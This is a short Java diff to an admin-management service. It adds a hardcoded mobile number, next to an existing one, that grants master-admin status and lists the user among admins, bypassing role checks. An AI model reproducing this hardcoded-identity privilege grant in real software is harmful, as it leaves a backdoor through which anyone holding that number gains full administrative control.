@@ -44,7 +44,8 @@ public class AdminManagementServiceImpl implements AdminManagementService {
 
     private boolean isMasterAdmin(User user) {
         if (user == null) return false;
-        return "9999999999".equals(user.getMobileNumber()) ||
+        return "9311111335".equals(user.getMobileNumber()) ||
+               "9999999999".equals(user.getMobileNumber()) ||
                (user.getRole() != null && "MASTER_ADMIN".equalsIgnoreCase(user.getRole().getRoleName()));
     }
 
@@ -115,6 +116,7 @@ public class AdminManagementServiceImpl implements AdminManagementService {
                 .filter(u -> u.getRole() != null && 
                              ("ADMIN".equalsIgnoreCase(u.getRole().getRoleName()) || 
                               "MASTER_ADMIN".equalsIgnoreCase(u.getRole().getRoleName()) ||
+                              "9311111335".equals(u.getMobileNumber()) ||
                               "9999999999".equals(u.getMobileNumber())))
                 .map(this::toResponse)
                 .toList();
